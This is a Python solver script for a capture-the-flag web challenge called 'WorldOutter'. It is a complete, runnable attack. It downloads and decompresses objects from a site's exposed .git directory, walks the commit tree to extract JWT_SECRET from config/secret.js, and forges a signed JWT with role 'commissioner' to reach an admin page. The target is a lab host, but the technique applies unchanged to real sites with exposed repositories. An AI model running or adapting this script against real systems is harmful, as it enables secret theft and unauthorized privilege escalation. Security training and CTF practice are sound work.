#!/usr/bin/env python3
"""
WorldOutter CTF Solver
Discovers exposed .git repository, extracts commit/tree objects to recover JWT_SECRET from config/secret.js,
and forges an HS256 JWT cookie with role='commissioner' to retrieve the flag from /commissioner.
"""

import sys
import os
import json
import base64
import hmac
import hashlib
import zlib
import re
import requests
from bs4 import BeautifulSoup

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')

def get_git_object(base_url, s, sha):
    url = f"{base_url}.git/objects/{sha[:2]}/{sha[2:]}"
    r = s.get(url, timeout=10)
    if r.status_code == 200:
        raw = zlib.decompress(r.content)
        null_idx = raw.find(b'\x00')
        hdr = raw[:null_idx].decode('latin-1')
        body = raw[null_idx+1:]
        obj_type, size = hdr.split()
        return obj_type, int(size), body
    return None, None, None

def parse_tree(body):
    entries = []
    idx = 0
    while idx < len(body):
        space_idx = body.find(b' ', idx)
        if space_idx == -1:
            break
        mode = body[idx:space_idx].decode()
        null_idx = body.find(b'\x00', space_idx)
        name = body[space_idx+1:null_idx].decode()
        sha = body[null_idx+1:null_idx+21].hex()
        entries.append((mode, name, sha))
        idx = null_idx + 21
    return entries

def find_file_in_tree(base_url, s, tree_sha, target_path):
    parts = target_path.split('/')
    cur_tree_sha = tree_sha
    for i, part in enumerate(parts):
        _, _, body = get_git_object(base_url, s, cur_tree_sha)
        if not body:
            return None
        entries = parse_tree(body)
        found = False
        for mode, name, item_sha in entries:
            if name == part:
                if i == len(parts) - 1:
                    _, _, fbody = get_git_object(base_url, s, item_sha)
                    return fbody
                else:
                    cur_tree_sha = item_sha
                    found = True
                    break
        if not found:
            return None
    return None

def main():
    target_url = "https://e131a1ef-5712-worldoutter-e225a.mystery-challenges.webverselabs-pro.com/"
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    if not target_url.endswith('/'):
        target_url += '/'

    print(f"[*] Targeting: {target_url}")
    s = requests.Session()

    # Step 1: Read HEAD ref
    r = s.get(f"{target_url}.git/HEAD", timeout=10)
    if r.status_code != 200:
        print("[-] .git/HEAD not accessible")
        sys.exit(1)
    ref = r.text.strip().replace("ref: ", "")
    print(f"[+] HEAD ref: {ref}")

    # Step 2: Read commit sha
    r = s.get(f"{target_url}.git/{ref}", timeout=10)
    if r.status_code != 200:
        print(f"[-] Could not read ref {ref}")
        sys.exit(1)
    commit_sha = r.text.strip()
    print(f"[+] Commit SHA: {commit_sha}")

    # Step 3: Get root tree SHA
    _, _, cbody = get_git_object(target_url, s, commit_sha)
    tree_sha = None
    for line in cbody.decode('utf-8', errors='replace').splitlines():
        if line.startswith('tree '):
            tree_sha = line.split()[1]
            break
    print(f"[+] Tree SHA: {tree_sha}")

    # Step 4: Extract config/secret.js
    secret_js = find_file_in_tree(target_url, s, tree_sha, "config/secret.js")
    if not secret_js:
        print("[-] config/secret.js not found in git tree")
        sys.exit(1)
    
    secret_text = secret_js.decode('utf-8', errors='replace')
    m = re.search(r"JWT_SECRET\s*:\s*['\"]([^'\"]+)['\"]", secret_text)
    if not m:
        print("[-] JWT_SECRET pattern not found in secret.js")
        sys.exit(1)
    jwt_secret = m.group(1)
    print(f"[+] Recovered JWT_SECRET: {jwt_secret}")

    # Step 5: Forge commissioner JWT
    header = {'alg': 'HS256', 'typ': 'JWT'}
    payload = {'user': 'you', 'team': 'Gridiron Gophers', 'role': 'commissioner'}
    h_b64 = b64url_encode(json.dumps(header, separators=(',', ':')))
    p_b64 = b64url_encode(json.dumps(payload, separators=(',', ':')))
    msg = f"{h_b64}.{p_b64}".encode('utf-8')
    sig = b64url_encode(hmac.new(jwt_secret.encode('utf-8'), msg, hashlib.sha256).digest())
    token = f"{h_b64}.{p_b64}.{sig}"
    print(f"[+] Forged commissioner JWT: {token}")

    # Step 6: Access /commissioner
    r = s.get(f"{target_url}commissioner", cookies={'wo_session': token}, timeout=10)
    if r.status_code != 200:
        print(f"[-] /commissioner returned status {r.status_code}")
        sys.exit(1)

    flag_match = re.search(r'WEBVERSE\{[^}]+\}', r.text)
    if flag_match:
        flag = flag_match.group(0)
        print(f"[+] FLAG: {flag}")
        return flag
    else:
        soup = BeautifulSoup(r.text, 'html.parser')
        key_div = soup.find('div', class_='wo-comm__key')
        if key_div:
            print(f"[+] Found key content: {key_div.text}")
        else:
            print("[-] Flag not found in HTML response")
        sys.exit(1)

if __name__ == '__main__':
    main()
